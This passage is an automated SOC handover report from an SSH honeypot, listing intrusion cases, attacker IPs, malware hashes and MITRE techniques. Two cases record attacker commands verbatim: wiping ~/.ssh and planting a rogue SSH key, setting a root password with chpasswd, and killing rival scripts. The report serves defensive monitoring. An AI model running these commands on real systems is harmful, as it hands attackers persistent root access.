| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HqvAVDewsuCk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 06:50:31` | `cowrie.session.connect` |
| `2026-06-07 06:50:31` | `cowrie.client.version` |
| `2026-06-07 06:50:31` | `cowrie.client.kex` |
| `2026-06-07 06:50:32` | `cowrie.login.success` |
| `2026-06-07 06:50:32` | `cowrie.session.params` |
| `2026-06-07 06:50:32` | `cowrie.command.input` |
| `2026-06-07 06:50:32` | `cowrie.command.failed` |
| `2026-06-07 06:50:32` | `cowrie.log.closed` |
| `2026-06-07 06:50:33` | `cowrie.session.params` |
| `2026-06-07 06:50:33` | `cowrie.command.input` |
| `2026-06-07 06:50:33` | `cowrie.session.file_download` |
| `2026-06-07 06:50:33` | `cowrie.log.closed` |
| `2026-06-07 06:50:43` | `cowrie.session.params` |
| `2026-06-07 06:50:43` | `cowrie.command.input` |
| `2026-06-07 06:50:43` | `cowrie.log.closed` |
| `2026-06-07 06:50:43` | `cowrie.session.params` |
| `2026-06-07 06:50:43` | `cowrie.command.input` |
| `2026-06-07 06:50:43` | `cowrie.log.closed` |
| `2026-06-07 06:50:44` | `cowrie.session.params` |
| `2026-06-07 06:50:44` | `cowrie.command.input` |
| `2026-06-07 06:50:44` | `cowrie.session.file_download` |
| `2026-06-07 06:50:44` | `cowrie.log.closed` |
| `2026-06-07 06:50:44` | `cowrie.session.params` |
| `2026-06-07 06:50:44` | `cowrie.command.input` |
| `2026-06-07 06:50:44` | `cowrie.log.closed` |
| `2026-06-07 06:50:45` | `cowrie.session.params` |
| `2026-06-07 06:50:45` | `cowrie.command.input` |
| `2026-06-07 06:50:45` | `cowrie.log.closed` |
| `2026-06-07 06:50:45` | `cowrie.session.params` |
| `2026-06-07 06:50:45` | `cowrie.command.input` |
| `2026-06-07 06:50:45` | `cowrie.command.input` |
| `2026-06-07 06:50:45` | `cowrie.log.closed` |
| `2026-06-07 06:50:46` | `cowrie.session.params` |
| `2026-06-07 06:50:46` | `cowrie.command.input` |
| `2026-06-07 06:50:47` | `cowrie.log.closed` |
| `2026-06-07 06:50:47` | `cowrie.session.params` |
| `2026-06-07 06:50:47` | `cowrie.command.input` |
| `2026-06-07 06:50:47` | `cowrie.log.closed` |
| `2026-06-07 06:50:47` | `cowrie.session.params` |
| `2026-06-07 06:50:47` | `cowrie.command.input` |
| `2026-06-07 06:50:47` | `cowrie.log.closed` |
| `2026-06-07 06:50:48` | `cowrie.session.params` |
| `2026-06-07 06:50:48` | `cowrie.command.input` |
| `2026-06-07 06:50:48` | `cowrie.log.closed` |
| `2026-06-07 06:50:48` | `cowrie.session.params` |
| `2026-06-07 06:50:48` | `cowrie.command.input` |
| `2026-06-07 06:50:48` | `cowrie.log.closed` |
| `2026-06-07 06:50:49` | `cowrie.session.params` |
| `2026-06-07 06:50:49` | `cowrie.command.input` |
| `2026-06-07 06:50:49` | `cowrie.log.closed` |
| `2026-06-07 06:50:49` | `cowrie.session.params` |
| `2026-06-07 06:50:49` | `cowrie.command.input` |
| `2026-06-07 06:50:49` | `cowrie.log.closed` |
| `2026-06-07 06:50:50` | `cowrie.session.params` |
| `2026-06-07 06:50:50` | `cowrie.command.input` |
| `2026-06-07 06:50:50` | `cowrie.log.closed` |
| `2026-06-07 06:50:50` | `cowrie.session.params` |
| `2026-06-07 06:50:50` | `cowrie.command.input` |
| `2026-06-07 06:50:50` | `cowrie.log.closed` |
| `2026-06-07 06:50:50` | `cowrie.session.params` |
| `2026-06-07 06:50:50` | `cowrie.command.input` |
| `2026-06-07 06:50:51` | `cowrie.log.closed` |
| `2026-06-07 06:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.153.91[.]15` to AbuseIPDB if not already reported
- [ ] Block `180.153.91[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b0947defe3

| Field | Detail |
|---|---|
| **Source IP** | `151.246.238[.]104` |
| **First Seen** | 2026-06-07 07:30 |
| **Last Seen** | 2026-06-07 07:35 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 07:30:43` | `cowrie.session.connect` |
| `2026-06-07 07:30:43` | `cowrie.client.version` |
| `2026-06-07 07:30:43` | `cowrie.client.kex` |
| `2026-06-07 07:30:45` | `cowrie.login.success` |
| `2026-06-07 07:35:45` | `cowrie.session.file_upload` |
| `2026-06-07 07:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.246.238[.]104` to AbuseIPDB if not already reported
- [ ] Block `151.246.238[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ad983c1c31

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:18 |
| **Last Seen** | 2026-06-07 09:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:18:04` | `cowrie.session.connect` |
| `2026-06-07 09:18:04` | `cowrie.client.version` |
| `2026-06-07 09:18:04` | `cowrie.client.kex` |
| `2026-06-07 09:18:06` | `cowrie.login.success` |
| `2026-06-07 09:18:06` | `cowrie.session.params` |
| `2026-06-07 09:18:06` | `cowrie.command.input` |
| `2026-06-07 09:18:06` | `cowrie.command.failed` |
| `2026-06-07 09:18:07` | `cowrie.log.closed` |
| `2026-06-07 09:18:07` | `cowrie.session.params` |
| `2026-06-07 09:18:07` | `cowrie.command.input` |
| `2026-06-07 09:18:08` | `cowrie.session.file_download` |
| `2026-06-07 09:18:08` | `cowrie.log.closed` |
| `2026-06-07 09:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12932ab646de

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:18 |
| **Last Seen** | 2026-06-07 09:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:18:11` | `cowrie.session.connect` |
| `2026-06-07 09:18:11` | `cowrie.client.version` |
| `2026-06-07 09:18:11` | `cowrie.client.kex` |
| `2026-06-07 09:18:13` | `cowrie.login.success` |
| `2026-06-07 09:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.80[.]171` | **267** | 2026-06-07 04:53 | 2026-06-07 09:18 | 211m | 0 | `T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **56** | 2026-06-07 04:19 | 2026-06-07 09:18 | 33m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.41[.]70` | **25** | 2026-06-07 08:40 | 2026-06-07 08:45 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `72.255.18[.]118` | **25** | 2026-06-07 07:40 | 2026-06-07 07:45 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `202.29.225[.]206` | **8** | 2026-06-07 05:30 | 2026-06-07 05:45 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.143[.]209` | **5** | 2026-06-07 04:29 | 2026-06-07 05:44 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]182` | **4** | 2026-06-07 08:31 | 2026-06-07 08:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.17.72[.]122` | **3** | 2026-06-07 05:37 | 2026-06-07 05:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]177` | **3** | 2026-06-07 08:31 | 2026-06-07 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | **3** | 2026-06-07 08:31 | 2026-06-07 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | **2** | 2026-06-07 06:50 | 2026-06-07 06:52 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.33.59[.]116` | **2** | 2026-06-07 09:07 | 2026-06-07 09:18 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.29.22[.]156` | **2** | 2026-06-07 05:47 | 2026-06-07 05:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.148.32[.]79` | **2** | 2026-06-07 08:21 | 2026-06-07 08:24 | 4m | 0 | `T1592` | 🟢 LOW |
| `74.249.128[.]248` | **2** | 2026-06-07 09:15 | 2026-06-07 09:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `75.187.110[.]192` | **2** | 2026-06-07 07:31 | 2026-06-07 07:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `83.246.133[.]16` | **2** | 2026-06-07 04:25 | 2026-06-07 04:34 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.26.136[.]75` | 1 | 2026-06-07 04:18 | 2026-06-07 04:18 | 32s | 0 | `T1592` | 🟢 LOW |
| `103.26.136[.]75` | 1 | 2026-06-07 09:06 | 2026-06-07 09:06 | 32s | 0 | `T1592` | 🟢 LOW |
| `113.53.29[.]79` | 1 | 2026-06-07 04:27 | 2026-06-07 04:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-06-07 04:47 | 2026-06-07 04:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.75[.]90` | 1 | 2026-06-07 09:10 | 2026-06-07 09:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.134[.]186` | 1 | 2026-06-07 09:07 | 2026-06-07 09:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.79.6[.]83` | 1 | 2026-06-07 04:58 | 2026-06-07 05:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.91[.]55` | 1 | 2026-06-07 04:27 | 2026-06-07 04:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.99.119[.]225` | 1 | 2026-06-07 05:53 | 2026-06-07 05:54 | 43s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]209` | 1 | 2026-06-07 06:22 | 2026-06-07 06:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]35` | 1 | 2026-06-07 05:45 | 2026-06-07 05:45 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (33 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `83.246.133[.]16` | RU | TTK-INTELBI networks | **100** ⚠️ | 5 |
| `151.246.238[.]104` | NL | NetGrid Host LTD | **100** ⚠️ | 1 |
| `66.132.172[.]182` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `195.96.139[.]209` | GB | Driftnet Ltd | **100** ⚠️ | 4 |
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `167.99.119[.]225` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `37.148.32[.]79` | IR | SHATEL DSL Network | **100** ⚠️ | 1 |
| `103.26.136[.]75` | BD | GRAMEEN COMMUNICATIONS | **100** ⚠️ | 1 |
| `20.29.22[.]156` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `223.123.41[.]70` | PK | CMPak Limited | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 454 cases |
| Tool 34  | Credential Extractor        | ✅ 38 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 33 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 28 recon entry/entries in table (17 group(s) consolidating 413 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T09:19:53Z_
